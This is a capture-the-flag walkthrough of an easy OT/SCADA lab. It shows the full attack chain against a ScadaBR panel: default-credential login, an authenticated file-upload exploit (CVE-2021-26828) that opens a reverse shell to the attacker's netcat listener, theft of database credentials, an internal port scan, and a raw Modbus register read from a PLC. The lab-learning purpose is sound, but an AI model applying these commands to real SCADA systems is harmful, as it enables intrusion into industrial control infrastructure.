#  Brr (v2.2) 

**Room:** Brr
**Category:** OT / SCADA
**Difficulty:** Easy
**Target IP:** 10.48.135.81

## Scenario

The room drops us into an OT (Operational Technology) environment with the hint: *"The cold never lies, but the panel guarding it just handed you the keys. Chase the chill all the way down."* This points toward a cooling/chiller system controlled by a SCADA panel, with the flag hidden somewhere behind it.

---

## 1. Reconnaissance

Ran a full port scan against the target:

```bash
nmap -sC -sV -p- 10.48.135.81 -T5
```

**Relevant open ports:**

| Port | Service | Notes |
|------|---------|-------|
| 22   | SSH (OpenSSH 9.6p1) | Not used in this path |
| 80   | HTTP (WebSockify Python/3.12.3) | Likely a VNC-over-websocket bridge |
| 5020 | Unknown (zenginkyo-1) | Later identified as Modbus TCP (alternate port) |
| 5901 | VNC | Not used in this path |
| 8080 | HTTP — Apache Tomcat/Coyote | Page title: **ScadaBR CTF** |

Port 8080 stood out immediately — it hosts a **ScadaBR** instance, an open-source SCADA/HMI web application built on the old Mango M2M framework. This confirmed the "panel" in the room description.

---

## 2. Gaining Access to ScadaBR

Navigated to:

```
http://10.48.135.81:8080/ScadaBR/
```

The login page loaded successfully. ScadaBR ships with default credentials on fresh installs, so tried:

```
Username: admin
Password: admin
```

**Login succeeded** — full administrative access to the ScadaBR dashboard was obtained.

Exploring the dashboard, under **Watch List** a data point was visible:

```
secret - test
Status: "The point or its data source may be disabled."
```

This confirmed there was a hidden/disabled data point named "secret" worth investigating further — this became the target for the rest of the room.

---

## 3. Exploiting ScadaBR — Authenticated RCE (CVE-2021-26828)

ScadaBR versions 1.0–1.1CE are vulnerable to an **authenticated arbitrary file upload** vulnerability via `view_edit.shtm`, allowing upload and execution of a malicious `.jsp` webshell (CVE-2021-26828).

**Exploit used:** [hev0x/CVE-2021-26828_ScadaBR_RCE](https://github.com/hev0x/CVE-2021-26828_ScadaBR_RCE)

```bash
git clone https://github.com/hev0x/CVE-2021-26828_ScadaBR_RCE.git
cd CVE-2021-26828_ScadaBR_RCE
```

Started a Netcat listener:

```bash
nc -lvnp 4444
```

Ran the exploit against the target using the discovered admin credentials:

```bash
python2 LinScada_RCE.py 10.48.135.81 8080 admin admin 192.168.179.226 4444
```

**Output:**

```
[+] Trying to authenticate http://10.48.135.81:8080/ScadaBR/login.htm...
[+] Successfully authenticated! :D~
[>] Attempting to upload .jsp Webshell...
[>] Verifying shell upload...
[+] Upload Successfuly!
[+] Webshell Found in: http://10.48.135.81:8080/ScadaBR/uploads/1.jsp
[>] Spawning Reverse Shell...
[+] Connection received
```

Caught the shell on the listener:

```
listening on [any] 4444 ...
connect to [192.168.179.226] from (UNKNOWN) [10.48.135.81] 40716
```

Confirmed identity:

```bash
id
```
```
uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
```

Shell landed as low-privileged user `tomcat7`, running inside the Tomcat web application container. Membership in the `dialout` group was noted (relevant to hardware/serial access, though ultimately not the path used).

Upgraded to a full TTY for a stable interactive shell:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## 4. Extracting Database Credentials

ScadaBR stores its backend database configuration in a properties file inside its web app directory:

```bash
cat /var/lib/tomcat7/webapps/ScadaBR/WEB-INF/classes/env.properties
```

**Relevant output:**

```
db.type=mysql
db.url=jdbc:mysql://localhost/scadabr
db.username=scadabr
db.password=scadabr
```

These credentials give direct access to the ScadaBR MySQL backend.

---

## 5. Digging Into the Database — Finding the "Secret" Data Source

Connected to MySQL using the recovered credentials:

```bash
mysql -u scadabr -pscadabr -h 127.0.0.1 scadabr -e "SHOW TABLES;"
```

Listed the tables (`dataPoints`, `dataSources`, `watchLists`, `pointValues`, etc.) — ScadaBR/Mango's schema for storing SCADA data configuration.

Queried the `dataSources` table, which stores serialized Java objects describing each configured data source:

```bash
mysql -u scadabr -pscadabr -h 127.0.0.1 scadabr --raw --batch -e "SELECT * FROM dataSources;" > /tmp/ds.out
cat /tmp/ds.out | tr -c '[:print:]\n' '.'
```

**Key finding in the output:**

```
id  xid          name    dataSourceType  data
1   DS_644638    secret  3               ...com.serotonin.mango.vo.dataSource.modbus.ModbusIpDataSourceVO...
...TransportType...TCP...plc...
```

This revealed the "secret" data source is a **Modbus TCP** connection pointing to a host literally named **`plc`** — a separate container reachable over the internal Docker network (i.e., the simulated PLC/chiller controller referenced in the room's theme).

---

## 6. Reaching the PLC Container

Resolved the `plc` hostname from inside the `tomcat7` shell:

```bash
getent hosts plc
```
```
172.20.0.2      plc
```

Confirmed a live target on the internal Docker network. Since standard tools like `nc`, `ping`, and `pymodbus` weren't available on the compromised container, used Python's built-in `socket` module (available via `python3`, version 3.5.2) to port-scan the PLC host directly:

```bash
python3 -c "
import socket
for p in [502,102,2404,20000,44818,4840,8080,80,23,21,8443,1502,5020]:
    s=socket.socket(); s.settimeout(1)
    try:
        s.connect(('plc',p)); print(p,'OPEN')
    except: pass
    s.close()
"
```

**Result:**
```
5020 OPEN
```

Port **5020** — a common alternate Modbus TCP port — was open on the PLC container (the standard port 502 was closed/filtered).

---

## 7. Reading the Flag via Raw Modbus TCP

With no Modbus client library available on the target, a raw Modbus TCP **"Read Holding Registers"** (function code `0x03`) request was hand-crafted and sent directly over a Python socket:

```bash
python3 -c "
import socket
s=socket.socket(); s.settimeout(3)
s.connect(('plc',5020))
req=bytes([0x00,0x01,0x00,0x00,0x00,0x06,0x01,0x03,0x00,0x00,0x00,0x28])
s.send(req)
resp=s.recv(1024)
data=resp[9:]
chars=''.join(chr(data[i+1]) for i in range(0,len(data),2))
print(chars)
s.close()
"
```

**Request breakdown (Modbus TCP MBAP header + PDU):**
- `00 01` — Transaction ID
- `00 00` — Protocol ID (Modbus)
- `00 06` — Length of remaining bytes
- `01` — Unit ID
- `03` — Function code: Read Holding Registers
- `00 00` — Starting register address
- `00 28` — Quantity of registers to read (40)

Each register returned is a 16-bit value; the low byte of each register maps to an ASCII character, which the script decodes automatically.

**Output:**

```
THM{modbus_hid}
```

---

## Flag

```
THM{modbus_hid}
```

---

## Summary of Attack Chain

1. Recon identified ScadaBR (SCADA HMI) on port 8080.
2. Logged in using default credentials `admin:admin`.
3. Exploited CVE-2021-26828 (authenticated arbitrary `.jsp` file upload) to get a reverse shell as `tomcat7`.
4. Extracted MySQL credentials (`scadabr:scadabr`) from ScadaBR's `env.properties`.
5. Queried the ScadaBR database and found a "secret" Modbus TCP data source pointing to an internal host `plc`.
6. Resolved and port-scanned `plc` from the compromised container, finding an open Modbus service on port 5020.
7. Hand-crafted a raw Modbus TCP "Read Holding Registers" request and decoded the response to recover the flag: `THM{modbus_hid}`.
